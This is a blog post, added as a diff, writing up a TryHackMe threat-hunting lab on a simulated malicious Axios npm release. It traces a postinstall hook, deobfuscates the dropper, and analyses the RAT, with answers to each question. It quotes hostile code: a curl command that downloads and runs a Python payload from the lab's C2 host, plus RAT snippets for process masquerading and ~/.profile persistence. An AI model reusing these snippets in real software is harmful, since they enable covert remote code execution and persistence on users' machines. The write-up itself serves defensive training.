@@ -1,0 +1,489 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto" data-theme="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>Axios Supply Chain Attack | Jenn Shagrin</title>
+<meta name="description" content="TryHackMe threat hunting challenge — Axios npm supply chain attack. Malicious dependency discovery, JavaScript deobfuscation, RAT analysis, persistence identification, C2 traffic decoding.">
+<meta name="author" content="">
+<link rel="canonical" href="https://jennshaggy.github.io/axios-supply-chain.html">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.086cbe158e48a4a74f4fec1e99aa846e3b43c1f4abb8e972f3ad8921f1408291.css" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://jennshaggy.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://jennshaggy.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://jennshaggy.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://jennshaggy.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://jennshaggy.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+            .list {
+                background: var(--theme);
+            }
+            .toc {
+                background: var(--entry);
+            }
+        }
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+</script>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="/assets/css/extended/harmonize.css">
+<meta property="og:url" content="https://jennshaggy.github.io/axios-supply-chain.html">
+<meta property="og:site_name" content="Jenn Shagrin">
+<meta property="og:title" content="Axios Supply Chain Attack">
+<meta property="og:description" content="TryHackMe threat hunting — Axios npm supply chain attack. Malicious dependency, JS deobfuscation, RAT analysis, persistence, C2 decoding.">
+<meta property="og:locale" content="en-us">
+<meta property="og:type" content="article">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Axios Supply Chain Attack">
+<meta name="twitter:description" content="TryHackMe threat hunting — Axios npm supply chain attack. Malicious dependency, JS deobfuscation, RAT analysis, persistence, C2 decoding.">
+</head>
+
+<body id="top">
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://jennshaggy.github.io/" accesskey="h" title="Jenn Shagrin (Alt + H)">Jenn Shagrin</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="/security-defense/" title="Security &amp; Defense">
+                    <span class="active">Security &amp; Defense</span>
+                </a>
+            </li>
+            <li>
+                <a href="/networking.html" title="Networking">
+                    <span>Networking</span>
+                </a>
+            </li>
+            <li>
+                <a href="/systems-foundation.html" title="Systems">
+                    <span>Systems</span>
+                </a>
+            </li>
+            <li>
+                <a href="/applied-projects.html" title="Penetration Testing">
+                    <span>Penetration Testing</span>
+                </a>
+            </li>
+            <li>
+                <a href="/platforms-training.html" title="Training">
+                    <span>Training</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://iad.portfolio.instructure.com/shared/4c4c330d1376bf479a9cbb73190bad1a110fb33cf436c283" title="CIAT Portfolio" target="_blank" rel="noopener noreferrer">
+                    <span>CIAT Portfolio</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+
+<main class="main">
+<article class="post-single">
+  <header class="post-header">
+    <h1 class="post-title entry-hint-parent">Axios Supply Chain Attack</h1>
+    <div class="post-description">TryHackMe threat hunting challenge &mdash; On March 31, 2026, malicious versions of Axios were published to npm. Today, I'll be threat-hunting on the other side of the firewall.</div>
+  </header>
+
+  <div class="post-content">
+
+<p>The scenario: Richard Lee, a junior developer on a blog redesign, recently started learning Axios. The SOC team flagged his Ubuntu laptop (<code>lpt-18092</code>) in the initial sweep. The job is to verify whether he was infected before the attackers make their next move.</p>
+
+<p>Two malicious versions of Axios — <code>1.14.1</code> and <code>0.30.4</code> — were injected with a dependency that downloaded a second-stage RAT on Windows, macOS, and Linux. Security vendors attribute the attack to a North Korean financially motivated state actor (UNC1069). The attack chain: social engineering a maintainer via ClickFix, stealing his npm token, staging a fake dependency, injecting it into Axios, and letting every npm install do the rest.</p>
+
+<hr>
+
+<h2>Q1 — What is the version of the installed Axios library?</h2>
+
+<p>Confirmed Docker was running, then started hunting.</p>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 8.57.40 AM.png" alt="Docker confirmed running" style="max-width:100%;margin:1rem 0;">
+
+<p>The first <code>find</code> command across the entire filesystem produced too much output and had to be killed with <code>Ctrl+C</code>. Scoped it to <code>/home</code> instead:</p>
+
+<pre><code>find /home -name "package.json" 2>/dev/null</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 9.13.18 AM.png" alt="find /home returning package.json paths including Richard Lee's thm-blog directory" style="max-width:100%;margin:1rem 0;">
+
+<p>There it was in Richard's home directory. As my dad likes to say about something you're seeking: "It's always the last place you look."</p>
+
+<pre><code>cat /home/ubuntu/Desktop/thm-blog/node_modules/axios/package.json | grep '"version"'</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 9.18.13 AM.png" alt="axios package.json contents" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 9.19.46 AM.png" alt="version: 1.14.1 confirmed" style="max-width:100%;margin:1rem 0;">
+
+<p><strong>Answer:</strong> <code>1.14.1</code> — the malicious version from the briefing.</p>
+
+<hr>
+
+<h2>Q2 — What suspicious package does Axios depend on?</h2>
+
+<pre><code>cat /home/ubuntu/Desktop/thm-blog/node_modules/axios/package.json | grep -A5 '"dependencies"'</code></pre>
+
+<p>The legitimate Axios dependencies are <code>follow-redirects</code>, <code>form-data</code>, and <code>proxy-from-env</code>. <code>typing-coreutils</code> is the odd one out — designed to look innocuous by mimicking <code>coreutils</code>. I was closely following this attack as it unfolded in the real world. THM swapped in <code>typing-coreutils</code> as the stand-in for <code>plain-crypto-js</code>.</p>
+
+<pre><code>cat /home/ubuntu/Desktop/thm-blog/node_modules/typing-coreutils/package.json | grep '"version"'</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 9.27.36 AM.png" alt="typing-coreutils version confirmed as 1.6.4" style="max-width:100%;margin:1rem 0;">
+
+<p><strong>Answer:</strong> <code>typing-coreutils@1.6.4</code></p>
+
+<hr>
+
+<h2>Q3 — What command is run after the package installation?</h2>
+
+<p>Looking for a postinstall hook — likely in <code>typing-coreutils/package.json</code> under the <code>scripts</code> section:</p>
+
+<pre><code>cat /home/ubuntu/Desktop/thm-blog/node_modules/typing-coreutils/package.json | grep -A5 '"scripts"'</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 9.33.36 AM.png" alt="scripts section showing postinstall: node postinst.js" style="max-width:100%;margin:1rem 0;">
+
+<p>Suspicions confirmed. The <code>postinstall</code> hook fires automatically the instant npm finishes installing the package — no user interaction required. I feel for anyone cleaning up the real-world fallout from this.</p>
+
+<p><strong>Answer:</strong> <code>node postinst.js</code></p>
+
+<hr>
+
+<h2>Q4 — What is the encryption key for the JS strings?</h2>
+
+<pre><code>cat /home/ubuntu/Desktop/thm-blog/node_modules/typing-coreutils/postinst.js</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 9.40.09 AM.png" alt="postinst.js — heavily obfuscated payload" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 9.40.27 AM.png" alt="postinst.js continued — ord variable visible near the bottom" style="max-width:100%;margin:1rem 0;">
+
+<p>Shoutout to my Sec+ instructor for really hammering in the critical nature and diverse methods of obfuscation and deobfuscation. Right near the bottom:</p>
+
+<pre><code>ord = "OrDeR_7077"</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 9.42.36 AM.png" alt="ord = OrDeR_7077 — passed as the r parameter into every _trans_1 and _trans_2 call" style="max-width:100%;margin:1rem 0;">
+
+<p><code>ord</code> is passed as the <code>r</code> parameter into every <code>_trans_1</code> and <code>_trans_2</code> call. For everything in the <code>stq</code> array, it's the encryption and decryption key for all obfuscated strings.</p>
+
+<p><strong>Answer:</strong> <code>OrDeR_7077</code></p>
+
+<hr>
+
+<h2>Q5 — What is the full C2 URL found in the JS file?</h2>
+
+<p>The briefing suggested letting JavaScript deobfuscate itself via browser DevTools or Node.js. Firefox first — <code>F12</code> to open DevTools, Console tab:</p>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 9.50.15 AM.png" alt="Firefox DevTools console open" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 9.52.49 AM.png" alt="Firefox allow pasting prompt" style="max-width:100%;margin:1rem 0;">
+
+<p>Browser DevTools hit a wall — <code>Buffer</code> is a Node.js API, not a browser API. Moved to the terminal and saved the decode script to a file, then ran it with Node:</p>
+
+<pre><code>cat > /tmp/decode.js << 'EOF'
+[full decode script with stq array and ord]
+stq.forEach((s, i) => console.log(i, _trans_2(s, ord)));
+EOF
+node /tmp/decode.js</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 10.02.45 AM.png" alt="Node decode output — BINGO. Index 0: child_process, Index 3: C2 URL, Index 12: Linux payload" style="max-width:100%;margin:1rem 0;">
+
+<p>Breaking down the decoded output:</p>
+
+<ul>
+<li>Index 0 = <code>child_process</code> — Node.js module for executing system commands</li>
+<li>Index 1 = <code>os</code>, Index 2 = <code>fs</code></li>
+<li>Index 3 = the C2 base URL</li>
+<li>Index 5 = <code>win32</code>, Index 6 = <code>darwin</code> — OS detection branches</li>
+<li>Index 7 = Windows VBS payload, Index 9 = macOS osascript payload</li>
+<li>Index 12 = Linux payload</li>
+</ul>
+
+<p>The full URL is constructed by appending <code>x</code> — the argument passed to <code>_entry</code>. At the bottom of the original script: <code>1502068</code>.</p>
+
+<p><strong>Answer:</strong> <code>http://sfrquack.thm:8000/1502068</code></p>
+
+<hr>
+
+<h2>Q6 — What string is sent to the C2 to initiate the payload download?</h2>
+
+<p>The answer was in the decoded output from Index 12 — the Linux branch:</p>
+
+<pre><code>curl -o /tmp/.promise.py -d pypi.org/latest -s SCR_LINK && python3 /tmp/.promise.py SCR_LINK &</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 10.12.06 AM.png" alt="Decoded Index 12 — Linux curl payload with pypi.org/latest as POST body" style="max-width:100%;margin:1rem 0;">
+
+<p>The <code>-d</code> flag in curl means "data" — the POST body sent to the C2. <code>pypi.org/latest</code> is the string the infected machine sends to say "Hand me the payload." Artfully designed to look like a legitimate PyPI package request, blending in with normal developer traffic.</p>
+
+<p><strong>Answer:</strong> <code>pypi.org/latest</code></p>
+
+<hr>
+
+<h2>Q7 — What absolute path was the initial Python payload dropped to?</h2>
+
+<p>Also in Index 12: <code>-o /tmp/.promise.py</code>. The <code>-o</code> flag specifies the output file.</p>
+
+<p><strong>Answer:</strong> <code>/tmp/.promise.py</code></p>
+
+<hr>
+
+<h2>Q8 — What is the command line shown by ps aux?</h2>
+
+<pre><code>ls -la /tmp/.promise.py</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 10.23.45 AM.png" alt="ls -la /tmp/.promise.py — permission denied as regular user" style="max-width:100%;margin:1rem 0;">
+
+<p>Permission denied. Always read carefully.</p>
+
+<pre><code>ps aux | grep python</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 10.29.21 AM.png" alt="ps aux showing python3 process running as root with PID 2030" style="max-width:100%;margin:1rem 0;">
+
+<p>Running as root with PID 2030. To find the full path:</p>
+
+<pre><code>sudo cat /proc/2030/cmdline | tr '\0' ' '</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 10.35.12 AM.png" alt="Full command line — python3 running from hidden path" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>sudo ls -la /proc/2030/cwd</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 10.33.50 AM.png" alt="/proc/2030/cwd pointing to /app — suspicious system directory" style="max-width:100%;margin:1rem 0;">
+
+<p>Running from <code>/app</code> — which had deleted itself. Time to dig into Docker:</p>
+
+<pre><code>sudo find / -name "server.py" 2>/dev/null</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 10.57.39 AM.png" alt="find showing server.py inside Docker overlay filesystem" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 10.58.17 AM.png" alt="Docker containers — I spy containers" style="max-width:100%;margin:1rem 0;">
+
+<pre><code>sudo cat /var/lib/docker/rootfs/overlayfs/8d09.../app/server.py</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 10.59.08 AM.png" alt="server.py source — C2 server serving promise.py when it receives pypi.org/latest" style="max-width:100%;margin:1rem 0;">
+
+<p>There's the queen herself — the C2 server, serving <code>promise.py</code> when it receives <code>pypi.org/latest</code> in the POST body. Exactly as deduced.</p>
+
+<pre><code>sudo find /var/lib/docker -name "promise.py" 2>/dev/null</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 11.06.52 AM.png" alt="promise.py located inside Docker overlay" style="max-width:100%;margin:1rem 0;">
+
+<p>The full RAT. From <code>init_location()</code>:</p>
+
+<pre><code>PathStr = os.path.expanduser("~/.local/apt.conf")</code></pre>
+
+<p>And from <code>do_set_location()</code>:</p>
+
+<pre><code>os.execve(sys.executable, ["unattended-upgr", PathStr], os.environ.copy())</code></pre>
+
+<p>It disguises itself as <code>unattended-upgr</code> — mimicking the legitimate <code>unattended-upgrades</code> process. Blends right in with typical Ubuntu background processes. Nice try, bad guys.</p>
+
+<pre><code>ps aux | grep apt.conf</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 11.13.55 AM.png" alt="ps aux confirming unattended-upgr /home/ubuntu/.local/apt.conf running" style="max-width:100%;margin:1rem 0;">
+
+<p><strong>Answer:</strong> <code>unattended-upgr /home/ubuntu/.local/apt.conf</code></p>
+
+<hr>
+
+<h2>Q9 — What MITRE persistence technique is used?</h2>
+
+<p>From <code>init_location()</code> in <code>promise.py</code>:</p>
+
+<pre><code>profile = os.path.expanduser("~/.profile")
+line = f"({sys.executable} {PathStr} &)"
+with open(profile, "a") as f:
+    f.write("\n" + "# APT unattended upgrade")
+    f.write("\n" + line + " >/dev/null 2>&1\n")</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 11.30.29 AM.png" alt="apt.conf — copied payload with C2 URL already substituted" style="max-width:100%;margin:1rem 0;">
+
+<p>This twisted little bug appended itself to <code>~/.profile</code>, executing on every login shell. Disguised as a comment that reads <code># APT unattended upgrade</code> to avoid scrutiny.</p>
+
+<p><strong>Answer:</strong> <code>T1546.004</code> — Event Triggered Execution: Unix Shell Configuration Modification</p>
+
+<hr>
+
+<h2>Q10 — What is the decoded flag sent to the C2?</h2>
+
+<p>From the end of <code>work()</code> in <code>promise.py</code>: <code>"content": "9FycwVGZfJXdvl3X0lGZ1F2eNhEV"</code></p>
+
+<p>The string profile matched the <code>stq</code> array entries from the JS payload — same character set. Reversing it and base64 decoding:</p>
+
+<pre><code>python3 -c "import base64; s='9FycwVGZfJXdvl3X0lGZ1F2eNhEV'; r=s[::-1]; print(base64.b64decode(r + '=' * (4 - len(r) % 4)).decode('utf-8'))"</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 1.45.41 PM.png" alt="Final flag decoded — THM{audit_your_deps}" style="max-width:100%;margin:1rem 0;">
+
+<p><strong>Answer:</strong> <code>THM{audit_your_deps}</code></p>
+
+<hr>
+
+<h2>npm Debug Logs — Bonus Evidence</h2>
+
+<p>The cheat sheet mentioned npm debug logs as a detection opportunity worth knowing. The log from April 6th confirmed the postinstall firing:</p>
+
+<pre><code>sudo ls -la ~/.npm/_logs/
+cat ~/.npm/_logs/2026-04-06T00_29_54_717Z-debug-0.log</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 10.49.35 AM.png" alt="npm _logs directory — one log from April 6th" style="max-width:100%;margin:1rem 0;">
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 10.53.58 AM.png" alt="npm debug log line 22 — plain-crypto-js postinstall fired" style="max-width:100%;margin:1rem 0;">
+
+<p>Line 22: postinstall confirmed. During real npm supply chain attacks, these logs are often the clearest evidence of which dependency caused the infection and when. Worth knowing where they live.</p>
+
+<hr>
+
+<h2>Index 3 Deeper Decode</h2>
+
+<pre><code>node -e "..._trans_2('_Iax9WsuF3bx1W8tFfKxlScuEPaxmSsrEvKx4SMvE/LxsSsvELaxiW8tF3Lx+ScuEXKx', ord)..."</code></pre>
+
+<img src="/images/axios-ctf/Screenshot 2026-04-11 at 10.55.24 AM.png" alt="Index 3 decode — C2 base URL confirmed" style="max-width:100%;margin:1rem 0;">
+
+<p>Not yet the full URL — the C2 address again, confirming the base. The full path came from the <code>x</code> argument at the bottom of the original script.</p>
+
+<hr>
+
+<h2>Full Investigation Summary</h2>
+
+<pre><code>Q1  Axios version:           1.14.1
+Q2  Suspicious package:      typing-coreutils@1.6.4
+Q3  Postinstall command:     node postinst.js
+Q4  Encryption key:          OrDeR_7077
+Q5  C2 URL:                  http://sfrquack.thm:8000/1502068
+Q6  String sent to C2:       pypi.org/latest
+Q7  Initial payload path:    /tmp/.promise.py
+Q8  PS aux command:          unattended-upgr /home/ubuntu/.local/apt.conf
+Q9  MITRE persistence:       T1546.004
+Q10 Decoded flag:            THM{audit_your_deps}</code></pre>
+
+  </div>
+  <footer class="post-footer"></footer>
+</article>
+</main>
+
+<footer class="footer">
+    <span>&copy; 2026 <a href="https://jennshaggy.github.io/">Jenn Shagrin</a></span> ·
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &amp;
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({ behavior: "smooth" });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        const html = document.querySelector("html");
+        if (html.dataset.theme === "dark") {
+            html.dataset.theme = 'light';
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            html.dataset.theme = 'dark';
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+</script>
+</body>
+</html>
